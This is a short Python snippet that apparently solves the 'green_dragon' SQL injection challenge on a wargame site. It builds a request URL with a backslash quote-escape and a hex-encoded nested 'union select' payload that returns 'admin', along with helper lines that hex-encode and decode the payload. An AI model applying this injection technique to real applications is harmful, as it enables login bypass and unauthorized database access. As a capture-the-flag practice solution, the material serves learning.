url = "https://los.rubiya.kr/chall/green_dragon_74d944f888fd3f9cf76e4e230e78c45b.php?id=%5c&&pw=union%20select%200x5c,0x756e696f6e2073656c6563742030783631363436643639366523%23"

s = "union select 0x61646d696e#"

print(s.encode("utf-8").hex())

print(bytes.fromhex("756e696f6e2073656c6563742030783631363436643639366523").decode("utf-8"))
